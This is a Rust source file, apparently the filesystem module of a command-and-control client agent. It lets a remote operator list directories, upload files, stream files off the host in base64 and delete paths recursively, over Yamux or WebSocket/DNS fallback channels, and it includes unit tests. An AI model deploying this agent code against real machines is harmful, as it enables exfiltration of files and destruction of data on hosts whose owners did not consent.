// 文件系统操作模块
//
// 提供文件列表、上传和下载功能。
// 使用 base64 编码传输二进制文件。

use crate::error::{ClientError, Result};
use base64::{engine::general_purpose::STANDARD as BASE64, Engine};
use log::{debug, error, info};
use serde::{Deserialize, Serialize};
use std::fs;
use std::path::Path;
use std::time::SystemTime;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio_util::compat::FuturesAsyncReadCompatExt;
use yamux::Stream;

/// 文件信息结构
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct FileInfo {
    /// 文件名
    pub name: String,
    /// 文件大小（字节）
    pub size: u64,
    /// 是否为目录
    pub is_dir: bool,
    /// 修改时间（Unix 时间戳）
    pub modified_time: u64,
}

/// 文件系统请求 (YamuxStreamFS / YAMUX_STREAM_FS)
#[derive(Serialize, Deserialize, Debug)]
pub struct FsRequest {
    pub action: String,
    pub path: String,
    pub paths: Option<Vec<String>>,
}

/// 文件系统响应 (用于 Yamux Stream 0x03)
#[derive(Serialize, Deserialize, Debug, Default)]
pub struct FsResponse {
    pub status: String,
    pub error: Option<String>,
    pub files: Option<Vec<FileInfo>>,
    pub current_path: Option<String>,
    pub content: Option<String>,
}

/// 列出目录中的文件
///
/// # 参数
///
/// * `path` - 目录路径
///
/// # 返回值
///
/// 返回 JSON 字符串，包含文件列表。
///
/// # 示例
///
/// ```no_run
/// use c2_client_agent::fs::ls;
///
/// let result = ls(".").unwrap();
/// println!("Files: {}", result);
/// ```
pub fn ls(path: &str) -> Result<String> {
    // 如果路径为空，使用当前目录
    let path = if path.is_empty() { "." } else { path };

    info!("Listing directory: {}", path);

    let path_obj = Path::new(path);

    // 检查路径是否存在
    if !path_obj.exists() {
        error!("Path does not exist: {}", path);
        return Err(ClientError::IoError(std::io::Error::new(
            std::io::ErrorKind::NotFound,
            format!("Path not found: {}", path),
        )));
    }

    // 检查是否为目录
    if !path_obj.is_dir() {
        error!("Path is not a directory: {}", path);
        return Err(ClientError::IoError(std::io::Error::new(
            std::io::ErrorKind::InvalidInput,
            format!("Not a directory: {}", path),
        )));
    }

    let mut files = Vec::new();

    // 读取目录内容
    match fs::read_dir(path_obj) {
        Ok(entries) => {
            for entry in entries {
                match entry {
                    Ok(entry) => {
                        let metadata = match entry.metadata() {
                            Ok(m) => m,
                            Err(e) => {
                                error!("Failed to get metadata for {:?}: {}", entry.path(), e);
                                continue;
                            }
                        };

                        let name = entry.file_name().to_string_lossy().to_string();
                        let size = metadata.len();
                        let is_dir = metadata.is_dir();

                        // 获取修改时间
                        let modified_time = metadata
                            .modified()
                            .ok()
                            .and_then(|t| t.duration_since(SystemTime::UNIX_EPOCH).ok())
                            .map(|d| d.as_secs())
                            .unwrap_or(0);

                        files.push(FileInfo {
                            name,
                            size,
                            is_dir,
                            modified_time,
                        });
                    }
                    Err(e) => {
                        error!("Error reading directory entry: {}", e);
                        continue;
                    }
                }
            }
        }
        Err(e) => {
            error!("Failed to read directory {}: {}", path, e);
            return Err(ClientError::IoError(e));
        }
    }

    debug!("Found {} items in directory", files.len());

    // 序列化为 JSON
    match serde_json::to_string(&files) {
        Ok(json) => {
            info!("Directory listing completed: {} items", files.len());
            Ok(json)
        }
        Err(e) => {
            error!("Failed to serialize file list: {}", e);
            Err(ClientError::SerializationError(e))
        }
    }
}

/// 解析为绝对路径（用于文件管理路径显示）
pub fn resolve_path(path: &str) -> Result<String> {
    let path = if path.is_empty() { "." } else { path };
    let abs_path = fs::canonicalize(path).map_err(ClientError::IoError)?;
    #[allow(unused_mut)]
    let mut resolved = abs_path.to_string_lossy().to_string();

    #[cfg(target_os = "windows")]
    {
        if resolved.starts_with(r"\\?\UNC\") {
            resolved = format!(r"\\{}", &resolved[8..]);
        } else if resolved.starts_with(r"\\?\") {
            resolved = resolved[4..].to_string();
        }
    }

    Ok(resolved)
}

/// 上传文件
///
/// # 参数
///
/// * `path` - 目标文件路径
/// * `data_base64` - Base64 编码的文件内容
///
/// # 返回值
///
/// 成功返回 Ok(())，失败返回错误。
///
/// # 示例
///
/// ```no_run
/// use c2_client_agent::fs::upload;
///
/// let data = "SGVsbG8gV29ybGQh"; // "Hello World!" in base64
/// upload("test.txt", data).unwrap();
/// ```
pub fn upload(path: &str, data_base64: &str) -> Result<()> {
    info!("Uploading file: {}", path);

    // 解码 base64
    let data = match BASE64.decode(data_base64) {
        Ok(d) => d,
        Err(e) => {
            error!("Failed to decode base64 data: {}", e);
            return Err(ClientError::IoError(std::io::Error::new(
                std::io::ErrorKind::InvalidData,
                format!("decode error: {}", e),
            )));
        }
    };

    debug!("Decoded {} bytes", data.len());

    // 创建父目录（如果不存在）
    if let Some(parent) = Path::new(path).parent() {
        if !parent.exists() {
            debug!("Creating parent directory: {:?}", parent);
            fs::create_dir_all(parent)?;
        }
    }

    // 写入文件
    match fs::write(path, &data) {
        Ok(_) => {
            info!(
                "File uploaded successfully: {} ({} bytes)",
                path,
                data.len()
            );
            Ok(())
        }
        Err(e) => {
            error!("Failed to write file {}: {}", path, e);
            Err(ClientError::IoError(e))
        }
    }
}

/// 下载文件
///
/// # 参数
///
/// * `path` - 源文件路径
///
/// # 返回值
///
/// 返回 Base64 编码的文件内容。
///
/// # 示例
///
/// ```no_run
/// use c2_client_agent::fs::download;
///
/// let data = download("test.txt").unwrap();
/// println!("File data (base64): {}", data);
/// ```
pub fn download(path: &str) -> Result<String> {
    info!("Downloading file: {}", path);

    let path_obj = Path::new(path);

    // 检查文件是否存在
    if !path_obj.exists() {
        error!("File does not exist: {}", path);
        return Err(ClientError::IoError(std::io::Error::new(
            std::io::ErrorKind::NotFound,
            format!("File not found: {}", path),
        )));
    }

    // 检查是否为文件
    if !path_obj.is_file() {
        error!("Path is not a file: {}", path);
        return Err(ClientError::IoError(std::io::Error::new(
            std::io::ErrorKind::InvalidInput,
            format!("Not a file: {}", path),
        )));
    }

    // 读取文件
    let data = match fs::read(path_obj) {
        Ok(d) => d,
        Err(e) => {
            error!("Failed to read file {}: {}", path, e);
            return Err(ClientError::IoError(e));
        }
    };

    debug!("Read {} bytes from file", data.len());

    // 编码为 base64
    let encoded = BASE64.encode(&data);

    info!(
        "File downloaded successfully: {} ({} bytes)",
        path,
        data.len()
    );

    Ok(encoded)
}


// Control-plane chunk transfer (WS/DNS fallback only). TCP/Yamux agents use the
// FILE (0x0E) binary stream via file_stream; these commands exist so agents
// without a Yamux session (WebSocket / DNS) can still put/get files.

/// 分块上传文件(控制面回退,无 Yamux 会话的 agent 使用)
pub fn upload_chunk(path: &str, data_base64: &str, is_append: bool) -> Result<()> {
    info!("Uploading file chunk: {} (append: {})", path, is_append);
    if path.trim().is_empty() {
        return Err(ClientError::IoError(std::io::Error::new(
            std::io::ErrorKind::InvalidInput,
            "upload path is empty",
        )));
    }
    let data = match BASE64.decode(data_base64) {
        Ok(d) => d,
        Err(e) => {
            return Err(ClientError::IoError(std::io::Error::new(
                std::io::ErrorKind::InvalidData,
                format!("decode error: {}", e),
            )));
        }
    };
    let path_obj = Path::new(path);
    if let Some(parent) = path_obj.parent() {
        if !parent.as_os_str().is_empty() && !parent.exists() {
            fs::create_dir_all(parent).map_err(|e| {
                ClientError::IoError(std::io::Error::new(
                    e.kind(),
                    format!("create_dir_all({}): {}", parent.display(), e),
                ))
            })?;
        }
    }
    use std::fs::OpenOptions;
    use std::io::Write;
    // First chunk: create/truncate. Later chunks: append only.
    // On Windows, combining append+truncate is undefined — keep them exclusive.
    let mut opts = OpenOptions::new();
    opts.write(true).create(true);
    if is_append {
        opts.append(true);
    } else {
        opts.truncate(true);
    }
    let mut file = opts.open(path).map_err(|e| {
        ClientError::IoError(std::io::Error::new(
            e.kind(),
            format!("open({}): {}", path, e),
        ))
    })?;

    file.write_all(&data).map_err(|e| {
        ClientError::IoError(std::io::Error::new(
            e.kind(),
            format!("write({}): {}", path, e),
        ))
    })?;
    file.flush().map_err(ClientError::IoError)?;
    Ok(())
}

/// 分块下载文件(控制面回退,无 Yamux 会话的 agent 使用)
pub fn download_chunk(path: &str, offset: u64, size: usize) -> Result<(String, bool, u64)> {
    use std::fs::File;
    use std::io::{Read, Seek, SeekFrom};
    let path_obj = Path::new(path);
    if !path_obj.is_file() {
        return Err(ClientError::IoError(std::io::Error::new(
            std::io::ErrorKind::InvalidInput,
            "Not a valid file",
        )));
    }

    let mut file = File::open(path_obj).map_err(ClientError::IoError)?;
    let metadata = file.metadata().map_err(ClientError::IoError)?;
    let file_size = metadata.len();

    if offset >= file_size {
        return Ok(("".to_string(), true, file_size)); // EOF
    }

    file.seek(SeekFrom::Start(offset))
        .map_err(ClientError::IoError)?;

    let mut buffer = vec![0u8; size];
    let n = file.read(&mut buffer).map_err(ClientError::IoError)?;
    buffer.truncate(n);

    let is_eof = offset + (n as u64) >= file_size;
    let encoded = BASE64.encode(&buffer);

    Ok((encoded, is_eof, file_size))
}

/// 删除文件或目录（递归）
///
/// # 参数
///
/// * `path` - 目标路径
pub fn remove(path: &str) -> Result<()> {
    if path.trim().is_empty() {
        return Err(ClientError::IoError(std::io::Error::new(
            std::io::ErrorKind::InvalidInput,
            "Path is empty",
        )));
    }

    let path_obj = Path::new(path);
    if !path_obj.exists() {
        return Err(ClientError::IoError(std::io::Error::new(
            std::io::ErrorKind::NotFound,
            format!("Path not found: {}", path),
        )));
    }

    if path_obj.is_dir() {
        fs::remove_dir_all(path_obj)?;
    } else {
        fs::remove_file(path_obj)?;
    }

    Ok(())
}

/// 处理文件系统控制流 (YamuxStreamFS)
pub async fn handle_stream(stream: Stream) {
    info!("[FS] Handling file system stream");
    let (mut reader, mut writer) = tokio::io::split(stream.compat());

    // Read JSON request robustly (handle partial reads)
    let mut buf = Vec::new();
    let mut chunk = [0u8; 4096];
    let req = loop {
        let n = match reader.read(&mut chunk).await {
            Ok(0) => break None,
            Ok(n) => n,
            Err(e) => {
                error!("[FS] Failed to read request: {}", e);
                break None;
            }
        };

        buf.extend_from_slice(&chunk[..n]);
        match serde_json::from_slice::<FsRequest>(&buf) {
            Ok(req) => break Some(req),
            Err(e) if e.is_eof() => continue,
            Err(e) => {
                error!("[FS] Failed to parse request: {}", e);
                break None;
            }
        }
    };

    let Some(req) = req else {
        return;
    };

    let response = match req.action.as_str() {
        "list" => {
            let res = ls(&req.path);
            match res {
                Ok(json) => {
                    let files: Vec<FileInfo> = serde_json::from_str(&json).unwrap_or_default();
                    let resolved = resolve_path(&req.path).unwrap_or_else(|_| req.path.clone());
                    FsResponse {
                        status: "ok".into(),
                        files: Some(files),
                        current_path: Some(resolved),
                        ..Default::default()
                    }
                }
                Err(e) => FsResponse {
                    status: "error".into(),
                    error: Some(e.to_string()),
                    ..Default::default()
                },
            }
        }
        "read" => handle_read(&req.path),
        // download 走流式写 — 见 handle_download_stream,不走单帧全量序列化
        "download" => {
            // 流式 download:边读文件边 base64 分块写 stream + flush,避免整文件入内存 + 单帧卡 15s/120s
            handle_download_stream(&req.path, &mut writer).await;
            return; // handle_download_stream 已自己写完并 shutdown
        }
        "rm" => handle_rm(&req.path, req.paths),
        _ => FsResponse {
            status: "error".into(),
            error: Some("Unknown action".into()),
            ..Default::default()
        },
    };

    let resp_json = serde_json::to_vec(&response).unwrap_or_default();
    let _ = writer.write_all(&resp_json).await;
    // ⚡️ FIX: Flush and Shutdown explicitly
    let _ = writer.flush().await;
    let _ = writer.shutdown().await; // Sends FIN, server sees EOF
}

/// 流式 download:写 JSON 头(不含 content 字段)→ 边读文件边 base64 分块追加写 stream → shutdown。
///
/// 协议格式(单 JSON 文档,分块写入 + flush 让出 Yamux 背压):
/// ```text
/// {"status":"ok","content":"<base64 chunk 1><base64 chunk 2>...<base64 chunk N>"}
/// ```
/// server 端 `io.ReadAll` 收到 EOF 后整体 unmarshal,语义与原整帧一致;但写的过程
/// 不再是"内存里拼完整 JSON 再 write_all",而是"边读文件边序列化边写"。base64 字符
/// 集(A–Z a–z 0–9 + / =)无 JSON 转义字符,可直接写字节。
async fn handle_download_stream<W>(path: &str, writer: &mut W)
where
    W: tokio::io::AsyncWrite + Unpin,
{
    info!("[FS] Streaming download: {}", path);

    // 1. 校验文件
    let path_obj = Path::new(path);
    if !path_obj.exists() || !path_obj.is_file() {
        let resp = FsResponse {
            status: "error".into(),
            error: Some(format!("file not found: {}", path)),
            ..Default::default()
        };
        let resp_json = serde_json::to_vec(&resp).unwrap_or_default();
        let _ = writer.write_all(&resp_json).await;
        let _ = writer.flush().await;
        let _ = writer.shutdown().await;
        return;
    }

    // 2. 打开文件
    let mut file = match std::fs::File::open(path_obj) {
        Ok(f) => f,
        Err(e) => {
            let resp = FsResponse {
                status: "error".into(),
                error: Some(format!("open failed: {}", e)),
                ..Default::default()
            };
            let resp_json = serde_json::to_vec(&resp).unwrap_or_default();
            let _ = writer.write_all(&resp_json).await;
            let _ = writer.flush().await;
            let _ = writer.shutdown().await;
            return;
        }
    };

    // 3. 流式写 JSON 前缀:{"status":"ok","content":"
    //    然后边读文件边 base64 编码追加,中间 flush 让出 yamux 背压。
    //    最后写 JSON 后缀:"} 然后 shutdown。
    let prefix = b"{\"status\":\"ok\",\"content\":\"";
    if writer.write_all(prefix).await.is_err() {
        return;
    }

    const READ_CHUNK: usize = 512 * 1024; // 512 KiB raw → ~683 KiB base64
    let mut buf = vec![0u8; READ_CHUNK];
    let mut total_raw: u64 = 0;
    loop {
        let n = match std::io::Read::read(&mut file, &mut buf) {
            Ok(0) => break,
            Ok(n) => n,
            Err(e) => {
                error!("[FS] stream download read err: {}", e);
                let _ = writer.shutdown().await;
                return;
            }
        };
        let b64 = BASE64.encode(&buf[..n]);
        if writer.write_all(b64.as_bytes()).await.is_err() {
            return;
        }
        // flush 让 Yamux 背压生效,避免 server 端窗口塞死
        if writer.flush().await.is_err() {
            return;
        }
        total_raw += n as u64;
    }

    let suffix = b"\"}";
    let _ = writer.write_all(suffix).await;
    let _ = writer.flush().await;
    let _ = writer.shutdown().await;
    debug!(
        "[FS] stream download done: {} ({} bytes raw)",
        path, total_raw
    );
}

/// 实现全量文件下载 (Base64)
fn handle_download(path: &str) -> FsResponse {
    info!("[FS] Downloading full file: {}", path);
    match download(path) {
        Ok(base64_data) => FsResponse {
            status: "ok".into(),
            content: Some(base64_data),
            ..Default::default()
        },
        Err(e) => FsResponse {
            status: "error".into(),
            error: Some(e.to_string()),
            ..Default::default()
        },
    }
}

/// 实现文件预览加载 (限制 50KB)
fn handle_read(path: &str) -> FsResponse {
    info!("[FS] Reading file for preview: {}", path);
    match fs::read(path) {
        Ok(data) => {
            let max_len = 50 * 1024;
            let preview_data = if data.len() > max_len {
                &data[..max_len]
            } else {
                &data
            };
            let content = String::from_utf8_lossy(preview_data).to_string();
            FsResponse {
                status: "ok".into(),
                content: Some(content),
                ..Default::default()
            }
        }
        Err(e) => FsResponse {
            status: "error".into(),
            error: Some(e.to_string()),
            ..Default::default()
        },
    }
}

/// 实现批量删除
fn handle_rm(path: &str, paths: Option<Vec<String>>) -> FsResponse {
    let targets = paths.unwrap_or_else(|| vec![path.to_string()]);
    info!("[FS] Batch deleting {} items", targets.len());
    let mut errors = Vec::new();

    for p in targets {
        let path_obj = Path::new(&p);
        if !path_obj.exists() {
            continue;
        }

        let res = if path_obj.is_dir() {
            fs::remove_dir_all(path_obj)
        } else {
            fs::remove_file(path_obj)
        };

        if let Err(e) = res {
            errors.push(format!("{}: {}", p, e));
        }
    }

    if errors.is_empty() {
        FsResponse {
            status: "ok".into(),
            ..Default::default()
        }
    } else {
        FsResponse {
            status: "error".into(),
            error: Some(errors.join("; ")),
            ..Default::default()
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;
    use std::io::Write;
    use tempfile::TempDir;

    #[test]
    fn test_ls_current_directory() {
        // 列出当前目录
        let result = ls(".");
        assert!(result.is_ok());

        let json = result.unwrap();
        assert!(!json.is_empty());

        // 验证可以解析为 FileInfo 数组
        let files: Vec<FileInfo> = serde_json::from_str(&json).unwrap();
        assert!(!files.is_empty());
    }

    #[test]
    fn test_ls_empty_path_defaults_to_current_directory() {
        // 空路径应该默认为当前目录
        let result = ls("");
        assert!(result.is_ok());

        let json = result.unwrap();
        assert!(!json.is_empty());

        // 验证可以解析为 FileInfo 数组
        let files: Vec<FileInfo> = serde_json::from_str(&json).unwrap();
        assert!(!files.is_empty());

        // 验证结果与 "." 相同
        let result_dot = ls(".").unwrap();
        let files_dot: Vec<FileInfo> = serde_json::from_str(&result_dot).unwrap();

        // 两者应该返回相同数量的文件
        assert_eq!(files.len(), files_dot.len());
    }

    #[test]
    fn test_ls_nonexistent_directory() {
        let result = ls("/nonexistent/directory/xyz123");
        assert!(result.is_err());
    }

    #[test]
    fn test_upload_download_roundtrip() {
        let temp_dir = TempDir::new().unwrap();
        let file_path = temp_dir.path().join("test.txt");
        let file_path_str = file_path.to_str().unwrap();

        // 测试数据（使用 ASCII）
        let original_data = b"Hello, World! Test data 123";
        let base64_data = BASE64.encode(original_data);

        // 上传
        let upload_result = upload(file_path_str, &base64_data);
        assert!(upload_result.is_ok());

        // 下载
        let download_result = download(file_path_str);
        assert!(download_result.is_ok());

        let downloaded_base64 = download_result.unwrap();
        assert_eq!(base64_data, downloaded_base64);

        // 验证内容
        let decoded = BASE64.decode(&downloaded_base64).unwrap();
        assert_eq!(original_data, decoded.as_slice());
    }

    #[test]
    fn test_upload_creates_parent_directory() {
        let temp_dir = TempDir::new().unwrap();
        let file_path = temp_dir.path().join("subdir").join("test.txt");
        let file_path_str = file_path.to_str().unwrap();

        let data = BASE64.encode(b"test data");

        let result = upload(file_path_str, &data);
        assert!(result.is_ok());
        assert!(file_path.exists());
    }

    #[test]
    fn test_download_nonexistent_file() {
        let result = download("/nonexistent/file.txt");
        assert!(result.is_err());
    }

    #[test]
    fn test_upload_invalid_base64() {
        let temp_dir = TempDir::new().unwrap();
        let file_path = temp_dir.path().join("test.txt");
        let file_path_str = file_path.to_str().unwrap();

        let result = upload(file_path_str, "invalid!!!base64");
        assert!(result.is_err());
    }
}
